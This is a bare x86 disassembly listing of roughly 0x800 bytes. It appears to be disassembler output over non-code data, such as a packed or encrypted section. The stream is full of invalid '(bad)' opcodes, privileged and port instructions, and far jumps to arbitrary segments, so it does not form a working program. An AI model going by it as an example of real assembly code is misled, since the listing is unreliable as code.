  43040e:	jno    0x43041d
  430410:	sbb    DWORD PTR [edi],edi
  430412:	sub    BYTE PTR [edx+ecx*8+0x60],0x6f
  430417:	add    eax,0xc2d63325
  43041c:	lods   al,BYTE PTR ds:[esi]
  43041d:	push   edi
  43041e:	add    edi,0x3d8538bb
  430424:	inc    esp
  430425:	cmp    BYTE PTR [ecx],ah
  430427:	mov    edi,0x6451db35
  43042c:	add    bl,BYTE PTR [ebx-0x568a9a50]
  430432:	je     0x430493
  430434:	pushfw 
  430436:	and    eax,0x5bd9666c
  43043b:	sub    DWORD PTR [ecx+0x3d8130cc],ecx
  430441:	add    ebx,DWORD PTR ds:0x9b53a33d
  430447:	mov    cl,0x25
  430449:	jmp    0x4304b1
  43044b:	rol    DWORD PTR [ebx],cl
  43044d:	push   0x6c02750b
  430452:	add    ch,BYTE PTR [ecx]
  430454:	sbb    eax,0x4ad90c7b
  430459:	cmp    BYTE PTR [eax],dl
  43045b:	out    0x8b,eax
  43045d:	adc    BYTE PTR [esi+ebx*2],ah
  430460:	das    
  430461:	and    eax,0x95472f55
  430466:	and    al,0xa6
  430468:	inc    eax
  430469:	cmp    BYTE PTR [ebx+ebp*8],dl
  43046c:	pop    ss
  43046d:	mov    ebx,0x89811890
  430472:	jae    0x43043b
  430474:	jo     0x430421
  430476:	sbb    ebp,DWORD PTR [ebx-0x3a44effc]
  43047c:	js     0x4304b3
  43047e:	and    al,0x12
  430480:	fcomp  DWORD PTR [ebx]
  430482:	arpl   WORD PTR ds:0xdcaead5f,dx
  430488:	imul   edi,DWORD PTR [edx+0x2778a315],0xb
  43048f:	fist   DWORD PTR [esi+0x7b48bd7d]
  430495:	aas    
  430496:	inc    ebx
  430497:	jo     0x43050c
  430499:	sar    BYTE PTR [ebx],cl
  43049b:	jne    0x4304ac
  43049d:	jno    0x430478
  43049f:	inc    ecx
  4304a0:	jmp    0x4304cd
  4304a2:	test   edi,ebp
  4304a4:	int    0xde
  4304a6:	adc    BYTE PTR [edi],dl
  4304a8:	(bad)  [ebp+0x17]
  4304ab:	inc    ebp
  4304ac:	gs sub eax,0x3eaf6448
  4304b2:	imul   ecx,ebx,0x5a
  4304b5:	shl    BYTE PTR [ecx+0x7f],cl
  4304b8:	cmp    DWORD PTR [ebx],edx
  4304ba:	sbb    al,0xc6
  4304bc:	jmp    0x1043:0x68253f0e
  4304c3:	(bad)  
  4304c4:	jp     0x4304f5
  4304c6:	shl    BYTE PTR [edi+edx*4],cl
  4304c9:	sub    al,0x4d
  4304cb:	aaa    
  4304cc:	outs   dx,DWORD PTR ds:[esi]
  4304cd:	dec    edx
  4304ce:	pop    edx
  4304cf:	adc    ecx,DWORD PTR gs:[ebx+0x0]
  4304d3:	xor    eax,DWORD PTR [ebx]
  4304d5:	mov    WORD PTR [edi+ebx*8-0x65],fs
  4304d9:	imul   eax,ecx,0x577093ff
  4304df:	push   es
  4304e0:	mov    ebx,0xc0fb0963
  4304e5:	add    ebp,DWORD PTR [edi+0x9]
  4304e8:	mov    bh,0xb3
  4304ea:	add    eax,0x48100330
  4304ef:	xchg   esp,eax
  4304f0:	(bad)  
  4304f1:	jno    0x430536
  4304f3:	sub    al,0xa6
  4304f5:	mov    dl,0x10
  4304f7:	popa   
  4304f8:	push   cs
  4304f9:	and    eax,0xd22f8b
  4304fe:	(bad)  
  4304ff:	imul   ebp,DWORD PTR [ebp-0x450e48f3],0xffffff91
  430506:	mov    edx,0x2d3772b1
  43050b:	mov    ebx,cr1
  43050e:	je     0x4304fb
  430510:	push   eax
  430511:	sar    DWORD PTR [eax+0x78],0x31
  430515:	xor    eax,0x4d67df53
  43051a:	inc    eax
  43051b:	loopne 0x430529
  43051d:	push   cs
  43051e:	and    DWORD PTR [ecx+0x5e0c8f75],eax
  430524:	add    ah,BYTE PTR [ecx+0x28]
  430527:	retf   
  430528:	mov    edi,0x66cde057
  43052d:	or     ebx,DWORD PTR [ecx]
  43052f:	std    
  430530:	leave  
  430531:	inc    esp
  430532:	loopne 0x4305af
  430534:	retf   
  430535:	or     eax,DWORD PTR [ebx]
  430537:	or     edx,DWORD PTR [ecx]
  430539:	mov    ebx,0x596cb065
  43053e:	test   eax,0x63785755
  430543:	or     eax,0x6d07bd8a
  430548:	pop    ds
  430549:	pop    ss
  43054a:	adc    bl,dh
  43054c:	xor    ch,BYTE PTR [ebp+0x6725a773]
  430552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430553:	pop    esi
  430554:	mov    bl,0x15
  430556:	pop    ds
  430557:	sub    DWORD PTR [ecx+0x62],edx
  43055a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43055b:	(bad)  
  43055c:	mov    ds:0x5d838f60,eax
  430561:	scas   eax,DWORD PTR es:[edi]
  430562:	pop    eax
  430563:	pop    ecx
  430564:	or     al,0xae
  430566:	sbb    ecx,DWORD PTR [ebx]
  430568:	pop    ss
  430569:	(bad)  
  43056a:	add    al,0x76
  43056c:	idiv   bl
  43056e:	push   ebp
  43056f:	and    WORD PTR [edx],0x2b
  430573:	xor    BYTE PTR gs:[eax],dh
  430576:	push   edx
  430577:	shr    ebp,0x6a
  43057a:	mov    eax,DWORD PTR [edx+edx*8+0x73]
  43057e:	and    edx,DWORD PTR [ecx+0x5d524c52]
  430584:	int3   
  430585:	add    eax,0x247157b9
  43058a:	pop    ecx
  43058b:	dec    ebx
  43058c:	sub    BYTE PTR [eax],ah
  43058e:	add    ebp,DWORD PTR [ebp+0x32ae0ced]
  430594:	pop    eax
  430595:	lea    ebp,[ecx]
  430597:	mov    ecx,0x2855801b
  43059c:	rol    DWORD PTR [eax],1
  43059e:	dec    eax
  43059f:	fadd   st,st(2)
  4305a1:	sub    bl,bh
  4305a3:	dec    edi
  4305a4:	cmp    eax,0x71e87a6b
  4305a9:	sbb    DWORD PTR [edi],ebx
  4305ab:	lods   eax,DWORD PTR ds:[esi]
  4305ac:	or     al,0x63
  4305ae:	das    
  4305af:	pop    ds
  4305b0:	inc    ecx
  4305b1:	xchg   ebx,eax
  4305b2:	push   es
  4305b3:	xchg   esi,eax
  4305b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4305b5:	aad    0x36
  4305b7:	popa   
  4305b8:	cmp    eax,0x558bfd4a
  4305bd:	data16 ja 0x430621
  4305c0:	mov    ah,0x12
  4305c2:	dec    eax
  4305c3:	jns    0x430548
  4305c5:	adc    eax,0xd9af7822
  4305ca:	popa   
  4305cb:	jmp    0x4305cf
  4305cd:	mov    ds:0x6f6fd22f,eax
  4305d2:	in     eax,dx
  4305d3:	jns    0x430586
  4305d5:	test   BYTE PTR [eax+eiz*2],dh
  4305d8:	pop    ebx
  4305d9:	mov    edi,0x5f616712
  4305de:	dec    ebx
  4305df:	repnz loopne 0x4305a0
  4305e2:	sti    
  4305e3:	outs   dx,BYTE PTR ds:[esi]
  4305e4:	sbb    ebx,DWORD PTR [ecx+0x6f66fd17]
  4305ea:	push   esi
  4305eb:	out    dx,al
  4305ec:	gs dec ebp
  4305ee:	jae    0x4305a7
  4305f0:	pop    es
  4305f1:	daa    
  4305f2:	pop    esp
  4305f3:	pop    esp
  4305f4:	neg    bl
  4305f6:	push   edi
  4305f7:	or     DWORD PTR [ebx-0x7],ecx
  4305fa:	xchg   esp,eax
  4305fb:	cmp    eax,0xcd6b8b04
  430600:	sti    
  430601:	adc    eax,0x87841b3
  430606:	(bad)  
  430607:	outs   dx,BYTE PTR ds:[esi]
  430608:	popa   
  430609:	xchg   ecx,eax
  43060a:	arpl   WORD PTR [ecx+0x24],si
  43060d:	dec    esi
  43060e:	outs   dx,DWORD PTR ds:[esi]
  43060f:	test   BYTE PTR [eax+0x2b],dh
  430612:	adc    BYTE PTR [edi],bh
  430614:	(bad)  
  430615:	cmc    
  430616:	jb     0x43060f
  430618:	mov    esi,0x7ac37797
  43061d:	das    
  43061e:	xlat   BYTE PTR ds:[ebx]
  43061f:	adc    DWORD PTR [eax],eax
  430621:	push   edx
  430622:	xor    dh,dl
  430624:	(bad)  
  430625:	sub    DWORD PTR [ecx+0x6b8b6815],ebp
  43062b:	pop    ecx
  43062c:	xchg   ebx,eax
  43062d:	rol    BYTE PTR [ecx+ecx*2-0x1a985cf0],0x56
  430635:	ret    0x2248
  430638:	dec    ebp
  430639:	inc    edi
  43063a:	xor    DWORD PTR [ecx+0x5f19f181],eax
  430640:	sub    DWORD PTR [ebp+ecx*1+0x1a],esp
  430644:	popa   
  430645:	and    eax,0x36503131
  43064a:	xchg   esp,eax
  43064b:	dec    ebp
  43064c:	fs (bad) 
  43064e:	pop    ss
  43064f:	aas    
  430650:	inc    esi
  430651:	sub    BYTE PTR [ebx],bh
  430653:	mov    dl,0xb1
  430655:	sbb    BYTE PTR [edi],ch
  430657:	pop    ds
  430658:	jg     0x4305ee
  43065a:	or     eax,0xa200316c
  43065f:	mov    edi,ds
  430661:	cwde   
  430662:	jnp    0x43068c
  430664:	sub    dh,0xff
  430667:	cmp    al,0x3a
  430669:	jns    0x430691
  43066b:	jno    0x4306ac
  43066d:	or     DWORD PTR [edi],ecx
  43066f:	sub    ah,BYTE PTR ds:0xa8cc1217
  430675:	in     eax,dx
  430676:	aaa    
  430677:	mov    ebx,0x6a001082
  43067c:	push   ebp
  43067d:	ja     0x4306e9
  43067f:	inc    di
  430681:	or     al,0xc7
  430683:	inc    ecx
  430684:	shl    ecx,1
  430686:	mov    al,ds:0x35c7ef55
  43068b:	fmul   QWORD PTR ds:0x881c302
  430691:	dec    ecx
  430692:	outs   dx,BYTE PTR ds:[esi]
  430693:	imul   ebp,DWORD PTR [esi+ebx*2+0x45560fd8],0x52221002
  43069e:	push   esp
  43069f:	dec    esp
  4306a0:	sub    BYTE PTR [esi-0x11],dh
  4306a3:	sahf   
  4306a4:	cmp    DWORD PTR [eax],edx
  4306a6:	popf   
  4306a7:	or     esp,DWORD PTR [eax]
  4306a9:	push   ebp
  4306aa:	push   esp
  4306ab:	jns    0x43071d
  4306ad:	push   ds
  4306ae:	or     al,0x4b
  4306b0:	not    BYTE PTR [esi]
  4306b2:	or     DWORD PTR [eax+0x331c09c5],0x4d
  4306b9:	push   fs
  4306bb:	imul   edx,DWORD PTR [eax+edx*8+0x73],0xffffffc9
  4306c0:	push   eax
  4306c1:	add    dl,BYTE PTR [ebp+ebx*8-0x54]
  4306c5:	mov    ds:0x6043328a,al
  4306ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4306cb:	fwait
  4306cc:	push   eax
  4306cd:	lea    ecx,[edx]
  4306cf:	and    al,0x15
  4306d1:	inc    esp
  4306d2:	mov    ah,0xdc
  4306d4:	fcom   QWORD PTR [ecx+0x3d]
  4306d7:	push   0x45736f66
  4306dc:	inc    esp
  4306dd:	fistp  DWORD PTR [eax-0x1f]
  4306e0:	pop    eax
  4306e1:	xor    al,0x2b
  4306e3:	test   DWORD PTR [esp+eax*1],eax
  4306e6:	mov    edi,0x696870af
  4306eb:	arpl   WORD PTR [ebx-0x48],si
  4306ee:	xor    BYTE PTR [eax+0x50f4505],0x41
  4306f5:	mov    dl,0x20
  4306f7:	repz in al,0x7f
  4306fa:	xor    ebp,esp
  4306fc:	add    al,0x63
  4306fe:	add    DWORD PTR [eax],eax
  430700:	add    DWORD PTR [ebx+0x6c],edx
  430703:	gs gs jo 0x4306e7
  430707:	popa   
  430708:	lds    eax,FWORD PTR [eax]
  43070a:	sub    BYTE PTR [esi+0x54],bh
  43070d:	ins    BYTE PTR es:[edi],dx
  43070e:	jae    0x430763
  430710:	gs je  0x43078e
  430713:	add    DWORD PTR [eax+0x470cf248],0x5aef6ac6
  43071d:	sti    
  43071e:	inc    ecx
  43071f:	ins    BYTE PTR es:[edi],dx
  430720:	ins    BYTE PTR es:[edi],dx
  430721:	push   es
  430722:	or     edx,DWORD PTR ds:0x75646f4d
  430728:	cmp    esp,edi
  43072a:	ins    BYTE PTR es:[edi],dx
  43072b:	add    al,0xaa
  43072d:	adc    eax,0xa2f44041
  430732:	jmp    0xd2f0:0x1fb5551
  430739:	mov    ecx,0x46610ab4
  43073e:	outs   dx,DWORD PTR ds:[esi]
  43073f:	jb     0x43076d
  430741:	mov    al,ds:0xa230622
  430746:	call   0x6956:0x1ff6dbb
  43074d:	jb     0x4307c3
  43074f:	jne    0x430799
  430751:	push   ecx
  430752:	push   edx
  430753:	jb     0x4307ce
  430755:	jle    0x43079f
  430757:	or     edx,DWORD PTR [edx+0x1]
  43075a:	icebp  
  43075b:	sub    esp,DWORD PTR [ecx]
  43075d:	pcmpgtd mm6,QWORD PTR [edi+0x7645fb59]
  430764:	or     ecx,DWORD PTR gs:[ecx]
  430767:	pop    ebx
  430768:	dec    edi
  430769:	dec    dx
  43076b:	sub    bl,BYTE PTR [ecx-0x7f]
  43076e:	mov    al,ds:0x9dbd19b9
  430773:	cdq    
  430774:	stos   BYTE PTR es:[edi],al
  430775:	mov    ch,0x15
  430777:	dec    ebp
  430778:	add    DWORD PTR [ecx+ebp*2+0x76],0xcd6dd736
  430780:	call   0xa269:0x78431a11
  430787:	cmp    BYTE PTR [ebx+0x3a],ah
  43078a:	jmp    0x699b:0x150a023
  430791:	mov    bh,0xbd
  430793:	xchg   ebp,eax
  430794:	fisttp QWORD PTR [edi]
  430796:	imul   edi,DWORD PTR [edx+0x1a],0xb736ed5
  43079d:	loop   0x4307b8
  43079f:	stos   BYTE PTR es:[edi],al
  4307a0:	add    BYTE PTR [esi+ecx*1],dl
  4307a3:	adc    eax,0xaa020cbb
  4307a8:	gs adc dh,ah
  4307ab:	test   al,0x48
  4307ad:	inc    esp
  4307ae:	cdq    
  4307af:	mov    bh,0x22
  4307b1:	mov    bh,0x63
  4307b3:	mov    bl,0x6f
  4307b5:	adc    DWORD PTR [esi+ebp*8+0xd],esp
  4307b9:	push   eax
  4307ba:	jb     0x4307e7
  4307bc:	inc    ecx
  4307bd:	fs push ss
  4307bf:	inc    eax
  4307c0:	push   0xc67264d4
  4307c5:	movups XMMWORD PTR [eax+0x41],xmm1
  4307c9:	les    ebx,FWORD PTR [ebx-0x57]
  4307cc:	adc    ah,BYTE PTR [eax-0x72]
  4307cf:	call   0x880f:0xcc6013bd
  4307d6:	sbb    BYTE PTR [ecx+0x3b],0x54
  4307da:	imul   ebx,DWORD PTR [esi],0x58dbf20d
  4307e0:	xor    BYTE PTR [eax],bh
  4307e2:	or     eax,0x506c3d46
  4307e7:	popa   
  4307e8:	je     0x430852
  4307ea:	mov    esp,0x4b5bf776
  4307ef:	inc    ecx
  4307f0:	je     0x43078a
  4307f2:	bound  esi,QWORD PTR [ebp+0x74]
  4307f5:	ja     0x43080a
  4307f7:	mov    al,0x85
  4307f9:	push   eax
  4307fa:	add    eax,0x6b3012e2
  4307ff:	or     eax,0x7765345b
  430804:	ins    DWORD PTR es:[edi],dx
  430805:	push   es
  430806:	nop    DWORD PTR [edx+edx*1]
  43080a:	add    DWORD PTR [edx+eiz*8+0x6d6b6449],eax
  430811:	in     al,dx
  430812:	popf   
  430813:	adc    edx,DWORD PTR [eax-0x7c]
  430816:	or     al,BYTE PTR [ecx+0xb]
  430819:	pop    es
  43081a:	das    
  43081b:	das    
  43081c:	mov    eax,0x36943549
  430821:	jnp    0x430898
  430823:	ins    DWORD PTR es:[edi],dx
  430824:	inc    ebx
  430825:	cmp    BYTE PTR [esi+esi*2],cl
  430828:	jae    0x4307d4
  43082a:	into   
  43082b:	popa   
  43082c:	jb     0x4307dc
  43082e:	inc    ebp
  43082f:	mov    ds:0x4a76c256,al
  430834:	dec    edx
  430835:	inc    esp
  430836:	gs and al,0x74
  430839:	popa   
  43083a:	mov    eax,ebp
  43083c:	add    BYTE PTR [eax],al
  43083e:	gs mov al,0xc
  430841:	lods   eax,DWORD PTR ds:[esi]
  430842:	std    
  430843:	and    cl,BYTE PTR [esi+edi*4]
  430846:	or     eax,0x11ab6d6f
  43084b:	and    BYTE PTR [esp+edi*4+0x9],ch
  43084f:	pusha  
  430850:	rsqrtps xmm6,XMMWORD PTR [ebx+0x38]
  430854:	or     BYTE PTR [ecx-0x19],ah
  430857:	mov    WORD PTR [edi+0x18],es
  43085a:	push   edi
  43085b:	or     BYTE PTR [ebx-0x4a],ah
  43085e:	inc    eax
  43085f:	jmp    0x1182:0x1d92009a
  430866:	test   DWORD PTR [eax],edi
  430868:	or     al,0x65
  43086a:	mov    esp,0x92db3043
  43086f:	sbb    dl,dh
  430871:	pop    ebp
  430872:	and    BYTE PTR [ebx+eiz*2],al
  430875:	xor    dl,BYTE PTR [ebx+0x49]
  430878:	mov    dh,0x7
  43087a:	adc    eax,esi
  43087c:	sub    BYTE PTR [esp+eax*1-0x46],0x63
  430881:	dec    ebp
  430882:	dec    esi
  430883:	cwde   
  430884:	fist   DWORD PTR ds:0x49151d6d
  43088a:	outs   dx,BYTE PTR ds:[esi]
  43088b:	mov    esp,DWORD PTR [eax+0x5703253e]
  430891:	imul   esp,DWORD PTR [ebp+eiz*2-0x8],0xb1cd0011
  430899:	push   esp
  43089a:	outs   dx,DWORD PTR ds:[esi]
  43089b:	iret   
  43089c:	sahf   
  43089d:	pop    ebp
  43089e:	fwait
  43089f:	fs jae 0x43091c
  4308a2:	bound  edx,QWORD PTR [ebx+0x44]
  4308a5:	sub    al,0xb5
  4308a7:	outs   dx,DWORD PTR ds:[esi]
  4308a8:	pop    eax
  4308a9:	dec    ebx
  4308aa:	pushw  0x2a29
  4308ae:	and    BYTE PTR [ebx],ch
  4308b0:	xor    eax,0x6d4a1435
  4308b5:	adc    al,0xa4
  4308b7:	dec    ecx
  4308b8:	test   al,0x41
  4308ba:	or     eax,0x99f7b47
  4308bf:	arpl   WORD PTR [eax+0x79],si
  4308c2:	or     bh,BYTE PTR [edx+0x6e827cd]
  4308c8:	xor    dh,BYTE PTR [esi-0x1d86df8e]
  4308ce:	popa   
  4308cf:	xchg   DWORD PTR [eax-0x4e],esi
  4308d2:	adc    eax,0xd3de4c60
  4308d7:	mov    bh,0xb7
  4308d9:	mov    ecx,0xf515b786
  4308de:	ins    DWORD PTR es:[edi],dx
  4308df:	dec    eax
  4308e0:	xchg   ebx,eax
  4308e1:	outs   dx,BYTE PTR ds:[esi]
  4308e2:	ss test eax,0x5f8760b9
  4308e8:	sahf   
  4308e9:	or     al,0x13
  4308eb:	ror    BYTE PTR [ecx+ebx*8-0x20a47d74],1
  4308f2:	unpcklps xmm6,XMMWORD PTR [eax-0x27bc93a2]
  4308f9:	js     0x430964
  4308fb:	xchg   ebp,eax
  4308fc:	xchg   ecx,eax
  4308fd:	pop    edx
  4308fe:	sub    ah,BYTE PTR [eax]
  430900:	(bad)  
  430901:	ds push ebp
  430903:	outs   dx,BYTE PTR ds:[esi]
  430904:	push   0xc7b66495
  430909:	jb     0x43094e
  43090b:	push   cs
  43090c:	pop    ss
  43090d:	inc    ecx
  43090e:	push   edx
  43090f:	je     0x43097d
  430911:	sbb    al,0x77
  430913:	and    eax,0x41e72d6b
  430918:	or     bh,BYTE PTR [edi+0x43]
  43091b:	and    BYTE PTR [ebp-0x3cde9c9a],bl
  430921:	imul   edi,ecx,0x22b10ec0
  430927:	ins    BYTE PTR es:[edi],dx
  430928:	dec    edi
  430929:	addr16 mov edi,esp
  43092c:	sub    al,0x76
  43092e:	pop    ss
  43092f:	add    al,dh
  430931:	adc    ecx,ecx
  430933:	dec    ebx
  430934:	gs jns 0x430945
  430937:	cs aaa 
  430939:	pop    ss
  43093a:	sbb    ecx,DWORD PTR [esi+0x106360f]
  430940:	inc    eax
  430941:	arpl   WORD PTR [ecx+0x70474ca0],ax
  430947:	ins    BYTE PTR es:[edi],dx
  430948:	jb     0x4308db
  43094a:	mov    ds:0x41ad9bbd,eax
  43094f:	push   ss
  430950:	adc    ecx,DWORD PTR [eax-0x2566fe9e]
  430956:	jae    0x430900
  430958:	addr16 dec eax
  43095a:	(bad)  
  43095b:	lock leave 
  43095d:	and    eax,DWORD PTR [edx]
  43095f:	sub    dh,dh
  430961:	sub    dh,dh
  430963:	or     eax,0x96c70d60
  430968:	stc    
  430969:	xor    cl,BYTE PTR [eax]
  43096b:	inc    edx
  43096c:	imul   ecx,DWORD PTR [esi+0x65],0xa
  430970:	cmp    BYTE PTR [edx+0x6e],cl
  430973:	mov    dl,0x1f
  430975:	ins    BYTE PTR es:[edi],dx
  430976:	xor    eax,0x1b61fcf6
  43097b:	mul    BYTE PTR [esi+0x6]
  43097e:	push   cs
  43097f:	dec    edx
  430980:	cs jbe 0x43097c
  430983:	dec    ebp
  430984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430985:	neg    DWORD PTR [edx-0x50ab356d]
  43098b:	inc    esp
  43098c:	arpl   WORD PTR [eax+0x24],bx
  43098f:	and    BYTE PTR [eax+0x9],bl
  430992:	xchg   edi,eax
  430993:	cmp    al,BYTE PTR [edx+0x11299a15]
  430999:	sbb    DWORD PTR ds:0x86bf6af4,esi
  43099f:	cmp    DWORD PTR [eax+0x76651f43],eax
  4309a5:	xor    al,0xe
  4309a7:	test   BYTE PTR [esi],ah
  4309a9:	sbb    BYTE PTR [ebx+esi*2-0x51],0x50
  4309ae:	xchg   BYTE PTR [eax+eax*8-0x2c],dh
  4309b2:	loope  0x4309d8
  4309b4:	adc    DWORD PTR [ebx+edi*1-0x5c],edi
  4309b8:	addr16 ret 
  4309ba:	xor    cl,BYTE PTR ds:0x50c84344
  4309c0:	sub    eax,0x42c22c96
  4309c5:	in     eax,dx
  4309c6:	ficom  WORD PTR fs:[edx]
  4309c9:	jne    0x4309e5
  4309cb:	mov    dh,0x25
  4309cd:	imul   esi,edi,0x23227446
  4309d3:	and    al,0xfb
  4309d5:	dec    ecx
  4309d6:	inc    DWORD PTR [edx+0x72]
  4309d9:	jne    0x430a4e
  4309db:	push   0xb6383138
  4309e0:	gs dec ebx
  4309e2:	cmovs  eax,DWORD PTR [ecx-0x5a]
  4309e6:	ins    DWORD PTR es:[edi],dx
  4309e7:	inc    edx
  4309e8:	sbb    BYTE PTR ds:0x69c4055c,bl
  4309ee:	or     al,0xf2
  4309f0:	inc    ecx
  4309f1:	jnp    0x430a1b
  4309f3:	add    ah,dh
  4309f5:	push   eax
  4309f6:	retf   
  4309f7:	jbe    0x4309fa
  4309f9:	imul   ebp,DWORD PTR [esi+0x14f13908],0xffffffb9
  430a00:	push   ebp
  430a01:	inc    edx
  430a02:	dec    esp
  430a03:	fsub   DWORD PTR [ecx+0x4c138ba0]
  430a09:	sub    al,ah
  430a0b:	mov    ebp,0x4a997c91
  430a10:	xchg   edi,eax
  430a11:	lea    ecx,[edx+esi*4]
  430a14:	adc    ch,BYTE PTR [edi+0x33]
  430a17:	sub    ebx,DWORD PTR [ecx+0x6b]
  430a1a:	retf   
  430a1b:	or     al,0x85
  430a1d:	or     BYTE PTR ds:0xe70a3d42,cl
  430a23:	fst    DWORD PTR [ecx-0x469d9e30]
  430a29:	lds    ebp,FWORD PTR [edx-0x3c]
  430a2c:	mov    dx,0x50e
  430a30:	pop    ds
  430a31:	push   ss
  430a32:	push   ss
  430a33:	fistp  DWORD PTR [edx+0x146e9c11]
  430a39:	adc    dh,al
  430a3b:	ins    BYTE PTR es:[edi],dx
  430a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a3d:	(bad)  
  430a3f:	sub    dh,BYTE PTR [eax]
  430a41:	dec    eax
  430a42:	jle    0x430a92
  430a44:	outs   dx,DWORD PTR ds:[esi]
  430a45:	pop    ebp
  430a46:	shl    DWORD PTR fs:[ecx+0x364c6669],cl
  430a4d:	fsub   DWORD PTR [edx+0x76]
  430a50:	jae    0x430a06
  430a52:	add    eax,0x83630881
  430a57:	(bad)  
  430a58:	js     0x4309df
  430a5a:	or     ebp,0xffffff82
  430a5d:	(bad)  
  430a5e:	dec    eax
  430a5f:	or     al,0x49
  430a61:	arpl   WORD PTR [edx+0x61],bx
  430a64:	rcr    DWORD PTR [eax],0x8
  430a67:	out    dx,al
  430a68:	add    DWORD PTR [ecx],edx
  430a6a:	icebp  
  430a6b:	cmc    
  430a6c:	fimul  WORD PTR [ebp+eax*2+0x4e1f4a0c]
  430a73:	in     al,dx
  430a74:	sbb    ebx,ebx
  430a76:	in     al,dx
  430a77:	lahf   
  430a78:	or     bh,BYTE PTR [edi]
  430a7a:	ja     0x430a62
  430a7c:	inc    edx
  430a7d:	jne    0x430ae5
  430a7f:	data16 (bad) 
  430a82:	addr16 pop ebx
  430a84:	xlat   BYTE PTR ds:[ebx]
  430a85:	jo     0x430ad6
  430a87:	inc    eax
  430a88:	inc    ecx
  430a89:	test   DWORD PTR [esi+ebx*8+0x5b876436],ebp
  430a90:	xchg   ebx,esp
  430a92:	bound  esp,QWORD PTR [esi+0x72]
  430a95:	and    BYTE PTR fs:[esi-0x39],bh
  430a99:	xchg   esi,eax
  430a9a:	and    eax,0x5a982c
  430a9f:	add    al,0xc
  430aa1:	test   ebx,0xc20e45b
  430aa7:	add    al,0x9
  430aa9:	or     eax,0xf185113
  430aae:	add    al,0x1c
  430ab0:	or     BYTE PTR [esi],cl
  430ab2:	xchg   ebx,eax
  430ab3:	add    esp,DWORD PTR [eax]
  430ab5:	mov    edi,0x2c081a00
  430aba:	or     dl,dh
  430abc:	(bad)  
  430abd:	(bad)  
  430abe:	dec    DWORD PTR [ebx]
  430ac0:	sub    eax,0xf007cf0b
  430ac5:	xchg   esp,eax
  430ac6:	add    DWORD PTR [edi+0x4c],esi
  430ac9:	pop    esi
  430aca:	push   ss
  430acb:	jns    0x430b31
  430acd:	pop    edx
  430ace:	push   edx
  430acf:	mov    ebp,cr5
  430ad2:	lock jae 0x430ad6
  430ad5:	cmp    al,0x1e
  430ad7:	or     ecx,DWORD PTR [ebx]
  430ad9:	or     BYTE PTR [edx],cl
  430adb:	fnsave [edi+0x616fdbf]
  430ae1:	push   cs
  430ae2:	adc    eax,0x8060319
  430ae7:	adc    dl,BYTE PTR [eax]
  430ae9:	(bad)  
  430aeb:	sub    eax,DWORD PTR [esi]
  430aed:	or     eax,0xa152505
  430af2:	(bad)  
  430af3:	(bad)  
  430af4:	(bad)  
  430af6:	adc    ecx,DWORD PTR [esi]
  430af8:	sbb    BYTE PTR [esi],bl
  430afa:	sbb    al,0xb
  430afc:	and    eax,0xa214c18
  430b01:	push   ecx
  430b02:	push   ss
  430b03:	push   eax
  430b04:	and    BYTE PTR [eax+esi*8],ah
  430b07:	inc    edi
  430b08:	add    DWORD PTR ds:0x93d0c69,edx
  430b0e:	jg     0x430b0b
  430b10:	(bad)  
  430b11:	dec    DWORD PTR [ecx]
  430b13:	or     ecx,DWORD PTR [ecx]
  430b15:	pop    es
  430b16:	sysret 
  430b18:	and    bl,BYTE PTR [ecx+0x8]
  430b1b:	mov    ch,BYTE PTR [eax*1+0x1b0a8805]
  430b22:	or     DWORD PTR [edx+0x9],esp
  430b25:	sbb    ah,BYTE PTR [esi]
  430b27:	cmp    DWORD PTR [ebx],esi
  430b29:	ss push cs
  430b2b:	inc    ebx
  430b2c:	or     DWORD PTR [eax],edx
  430b2e:	jg     0x430b2b
  430b30:	neg    bl
  430b32:	or     BYTE PTR [esi],al
  430b34:	sbb    al,0x5
  430b36:	or     DWORD PTR [ecx],ebx
  430b38:	or     DWORD PTR [esi],ebx
  430b3a:	cmp    al,0x26
  430b3c:	push   es
  430b3d:	adc    bl,BYTE PTR [eax]
  430b3f:	push   ss
  430b40:	and    DWORD PTR [edi],ecx
  430b42:	adc    BYTE PTR [eax],ah
  430b44:	pop    ds
  430b45:	xor    BYTE PTR [ecx+0x62fdb77],bh
  430b4b:	xor    esi,DWORD PTR [eiz*1+0x96b1410]
  430b52:	or     eax,0x6086906
  430b57:	(bad)  
  430b58:	mov    edi,0x702df6d
  430b5d:	or     al,bl
  430b5f:	cs push ds
  430b61:	and    esp,DWORD PTR [ecx+0xb]
  430b64:	sub    DWORD PTR [ebx],ebp
  430b66:	sub    BYTE PTR [ecx],bl
  430b68:	sbb    DWORD PTR [ecx],edx
  430b6a:	adc    eax,0x6ef0200d
  430b6f:	add    DWORD PTR [ecx],ecx
  430b71:	(bad)  
  430b72:	push   DWORD PTR [edi+0x6e0731ff]
  430b78:	lock dec edx
  430b7a:	add    DWORD PTR [eax],ebx
  430b7c:	adc    DWORD PTR [edx+eax*1],ebx
  430b7f:	or     al,0xf0
  430b81:	dec    ecx
  430b82:	add    bh,BYTE PTR [edi]
  430b84:	adc    BYTE PTR [esi],dl
  430b86:	push   ds
  430b87:	push   ss
  430b88:	pop    ss
  430b89:	adc    eax,0x167f03a
  430b8e:	imul   esi,eax,0xedfdbb3a
  430b94:	inc    DWORD PTR [ecx]
  430b96:	pop    edi
  430b97:	adc    al,0x8
  430b99:	push   ss
  430b9a:	sbb    BYTE PTR [esi],cl
  430b9c:	xor    al,0x1c
  430b9e:	or     al,0x14
  430ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ba1:	xor    BYTE PTR ds:0x35093209,ch
  430ba7:	mov    WORD PTR [ebp+0x44],cs
  430baa:	sub    BYTE PTR [esi-0x1],ch
  430bad:	mov    bh,0x7f
  430baf:	dec    eax
  430bb0:	add    DWORD PTR [eax],ebp
  430bb2:	pop    es
  430bb3:	sbb    BYTE PTR [edx],ah
  430bb5:	xor    al,0xc2
  430bb7:	das    
  430bb8:	sbb    BYTE PTR [eax+0x19],bl
  430bbb:	dec    edi
  430bbc:	add    al,0x6
  430bbe:	add    al,0x5
  430bc0:	pop    es
  430bc1:	push   edi
  430bc2:	or     ebx,DWORD PTR [ebx-0x1]
  430bc5:	mov    edi,0xb0617b9
  430bca:	sbb    eax,0xe6ed20a
